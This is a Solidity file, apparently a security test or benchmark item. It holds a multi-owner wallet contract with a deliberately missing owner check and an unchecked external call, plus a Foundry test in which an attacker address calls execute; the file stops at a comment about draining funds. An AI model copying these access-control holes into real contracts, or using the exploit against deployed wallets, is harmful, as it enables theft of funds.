pragma solidity ^0.8.33;

import "forge-std/Test.sol";

contract Wallet {
    mapping(address => bool) public isOwner;
    uint public required;
    uint public daylimit;
    mapping(address => uint) public lastDay;
    mapping(address => uint) public spentToday;

    event Execution(address indexed to, uint value, bytes data, bytes32 txHash);

    constructor(address[] memory _owners, uint _required, uint _daylimit) {
        require(_required > 0, "required>0");
        require(_owners.length >= _required, "owners<required");
        for (uint i = 0; i < _owners.length; i++) {
            isOwner[_owners[i]] = true;
        }
        required = _required;
        daylimit = _daylimit;
    }

    modifier onlyOwner() {
        require(isOwner[msg.sender], "only owner");
        _;
    }

    function execute(address to, uint value, bytes memory data) public returns (bytes32) {
        // Vulnerability: missing onlyOwner modifier or missing require for owner
        // Let's assume the bug is that onlyOwner is missing here, so anyone can call execute
        // but the function is intended to be onlyOwner protected

        // For demonstration, implement daily limit logic (simplified)
        if (value > 0) {
            uint day = block.timestamp / 1 days;
            if (day > lastDay[msg.sender]) {
                spentToday[msg.sender] = 0;
                lastDay[msg.sender] = day;
            }
            require(spentToday[msg.sender] + value <= daylimit, "limit exceeded");
            spentToday[msg.sender] += value;
        }

        (bool success, ) = to.call{value: value}(data);
        // Vulnerability: no require(success), so if call fails, no revert but returns hash anyway
        bytes32 txHash = keccak256(abi.encodePacked(to, value, data));
        emit Execution(to, value, data, txHash);
        return txHash;
    }

    receive() external payable {}
}

contract WalletExploitTest is Test {
    Wallet wallet;
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy Wallet with one owner and required=1, daylimit 1 ether
        address[] memory owners = new address[](1);
        owners[0] = address(this); // deployer is owner
        wallet = new Wallet(owners, 1, 1 ether);

        // Fund wallet with 1 ether
        vm.deal(address(this), 1 ether);
        payable(address(wallet)).transfer(1 ether);
    }

    function test_exploit_access_control() public {
        vm.prank(attacker);

        // Attacker calls execute(), which should be restricted to owners, but due to missing onlyOwner, it succeeds
        bytes memory data = "";
        bool callSucceeded;
        bytes32 ret;

        try wallet.execute(address(0), 0, data) returns (bytes32 hash) {
            callSucceeded = true;
            ret = hash;
        } catch {
            callSucceeded = false;
        }

        // Assert the call succeeded (no revert), which should not be possible for non-owner
        assertTrue(callSucceeded);

        // Attacker is not owner
        bool attackerIsOwner = wallet.isOwner(attacker);
        assertTrue(!attackerIsOwner);

        // Further test: attacker can drain funds by calling execute to send ether to self
        // Let's send 0.5 ether to attacker via execute

